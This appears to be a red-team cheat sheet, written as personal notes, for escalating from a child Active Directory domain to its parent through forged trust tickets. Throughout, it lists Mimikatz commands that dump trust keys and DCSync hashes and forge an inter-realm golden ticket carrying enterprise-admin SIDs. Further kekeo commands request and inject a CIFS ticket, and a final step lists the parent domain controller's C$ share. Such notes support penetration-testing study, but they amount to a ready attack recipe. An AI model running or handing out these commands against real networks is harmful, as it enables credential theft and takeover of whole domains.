# Child to parent - Trust tickets

### **Dump trust keys**

Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :( Look for NTLM hash (second command)

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
```



### **Create an inter-realm TGT**

```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
```



### **Create a TGS for a service (kekeo\_old)**

```
./asktgs.exe <kirbi file> CIFS/<forest dc name>
```



### **Use TGS to access the targeted service (may need to run it twice) (kekeo\_old)**

```
./kirbikator.exe lsa .\<kirbi file>
```



### **Check access to the server**

```
ls \\<servername>\c$ 
```
